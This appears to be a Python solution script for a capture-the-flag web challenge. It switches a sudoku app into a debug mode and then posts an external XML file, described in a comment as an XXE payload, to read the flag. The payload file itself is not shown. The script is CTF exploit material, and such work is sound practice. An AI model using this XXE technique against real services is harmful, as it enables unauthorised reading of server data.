# Solution for "Puzzling" web challenge for HackUCF Sunshine CTF 2024

import requests

import os
URL = os.environ.get("URL", "http://127.0.0.1:24304")

# Set difficulty to "debug"
S = requests.Session()

S.get(URL+"/sudoku/setDifficulty/debug")

headers = {
    'Content-Type': 'application/xml',
}

import os.path as _op
xml_data = open(_op.join(_op.dirname(__file__), "evil.xml")).read()

# Send malicious board with XXE payload to get flag in debug data
response = S.post(URL+"/sudoku/submit", data=xml_data, headers=headers)

print(response.text)
